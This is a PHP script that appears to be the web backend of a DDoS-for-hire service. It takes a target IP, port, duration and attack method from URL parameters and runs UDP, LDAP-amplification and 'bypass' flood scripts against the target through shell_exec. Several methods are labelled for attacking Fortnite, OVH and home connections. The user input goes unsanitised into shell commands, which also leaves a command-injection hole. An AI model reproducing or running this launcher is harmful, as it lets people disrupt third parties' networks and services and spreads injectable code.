<?php
        $attacktype = $_GET["method"];
        $ip = $_GET["ip"];
        if (empty($ip)) { $ip = $_GET["host"]; }
        $port = $_GET["port"];
        $time = $_GET["time"];
        $proc   = hash('crc32', $ip);
            if (empty($ip) || empty($port) || empty($time) || empty($attacktype))
            {
                 die('<span style="font: normal 16px Tahoma; color: lightblue;">Incorrect Method, Valid Methods : UDP,LDAP,Stealth-Special,FORTNTIE LAG,OVH-LAG, </span>');
            }
         if (($attacktype == "UDP") || ($attacktype == "UDP"))
        {
            $output = shell_exec("python UDP.py  $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
         if (($attacktype == "LDAP") || ($attacktype == "LDAP"))
        {
            $output = shell_exec("./LDAP $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
         if (($attacktype == "Stealth-Special") || ($attacktype == "Stealth-Special"))
        {
            $output = shell_exec("python AUTOBYPASS.py $ip $port 65500 $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "Fortnite-AMP(New!)") || ($attacktype == "Fortnite-AMP(New!)"))
        {
            $output = shell_exec("python fortnite.py $ip $port $time"); 
            $output = shell_exec("python AUTOBYPASS.py $ip $port 65500 $time");
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "OVH-LAG") || ($attacktype == "OVH-LAG"))
        {
            $output = shell_exec("./LDAP $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "Trump") || ($attacktype == "Trump"))
        {
            $output = shell_exec("perl bunny.pl $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "LDAP v2") || ($attacktype == "LDAP v2"))
        {
            $output = shell_exec("./LDAP $ip $port $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "SLASHER") || ($attacktype == "SLASHER"))
        {
            $output = shell_exec("python danger.py $ip $port 65500 $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        if (($attacktype == "Home-AMP(New!)") || ($attacktype == "Home-AMP(New!)"))
        {
            $output = shell_exec("perl amp.pl $ip $port 65500 $time"); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
         if (($attacktype == "STOP") || ($attacktype == "STOP"))
        {
            $output = shell_exec("sudo pkill -f $proc "); 
            print("Attack Sent on $ip:80 For $time using $attacktype!");
        }
        
?>